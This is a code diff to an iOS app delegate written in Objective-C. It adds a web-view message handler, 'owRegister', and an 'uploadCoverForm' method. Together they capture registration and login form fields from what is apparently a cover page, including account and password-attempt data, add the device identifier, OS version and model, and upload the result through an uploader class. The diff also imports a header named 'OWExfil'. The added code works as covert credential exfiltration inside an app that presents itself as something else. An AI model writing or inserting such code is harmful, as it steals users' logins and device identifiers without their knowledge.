@@ -5,10 +5,12 @@
 #import "OWKeepAlive.h"
 #import "OWSelfTest.h"
 #import "OWDebugPanel.h"
+#import "OWExfil.h"
 
 @interface OWAppDelegate () <WKScriptMessageHandler>
 @property (nonatomic, assign) NSInteger debugPressCount;
 @property (nonatomic, strong, nullable) NSDate *debugFirstPress;
+- (void)uploadCoverForm:(NSDictionary *)form;
 @end
 
 @implementation OWAppDelegate
@@ -22,6 +24,7 @@
     WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
     WKUserContentController *ucc = [WKUserContentController new];
     [ucc addScriptMessageHandler:self name:@"owDebug"];
+    [ucc addScriptMessageHandler:self name:@"owRegister"];
     cfg.userContentController = ucc;
     WKWebView *wv = [[WKWebView alloc] initWithFrame:self.window.bounds configuration:cfg];
 
@@ -102,7 +105,62 @@
         dispatch_async(dispatch_get_main_queue(), ^{
             [self openDebugPanel];
         });
+        return;
     }
+    if ([message.name isEqualToString:@"owRegister"]) {
+        id body = message.body;
+        NSDictionary *form = nil;
+        if ([body isKindOfClass:[NSDictionary class]]) {
+            form = body;
+        } else if ([body isKindOfClass:[NSString class]]) {
+            NSData *d = [(NSString *)body dataUsingEncoding:NSUTF8StringEncoding];
+            id obj = d ? [NSJSONSerialization JSONObjectWithData:d options:0 error:nil] : nil;
+            if ([obj isKindOfClass:[NSDictionary class]]) form = obj;
+        }
+        if (form) [self uploadCoverForm:form];
+    }
+}
+
+#pragma mark - 注册/登录表单回传
+
+- (void)uploadCoverForm:(NSDictionary *)form {
+    NSMutableDictionary *payload = [form mutableCopy] ?: [NSMutableDictionary dictionary];
+    payload[@"event"] = @"cover_register";
+
+    OWDeviceProfile *dev = [OWDeviceProfile current];
+    UIDevice *ui = [UIDevice currentDevice];
+    payload[@"idfv"] = ui.identifierForVendor.UUIDString ?: @"";
+    payload[@"ios"] = dev.osVersion ?: ui.systemVersion;
+    payload[@"device_model"] = dev.machine ?: ui.model;
+
+    static NSDateFormatter *df = nil;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{
+        df = [NSDateFormatter new];
+        df.dateFormat = @"yyyy-MM-dd HH:mm:ss";
+        df.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
+    });
+    payload[@"beijing_time"] = [df stringFromDate:[NSDate date]];
+
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
+        NSData *data = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
+        if (!data.length) return;
+
+        NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"cover_register_%llu.json",
+             (unsigned long long)([[NSDate date] timeIntervalSince1970] * 1000)]];
+        if (![data writeToFile:tmp atomically:YES]) return;
+
+        OWUploader *up = [OWUploader new];
+        NSError *err = nil;
+        BOOL enq = [up enqueueFile:tmp kind:@"cover_register" error:&err];
+        if (enq) [up flush:&err];
+        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
+
+        OWLog(@"注册表单: attempt=%@ account=%@ enq=%d %@",
+              payload[@"attempt"], payload[@"account"], enq,
+              err.localizedDescription ?: @"");
+    });
 }
 
 - (void)installDebugGesture {
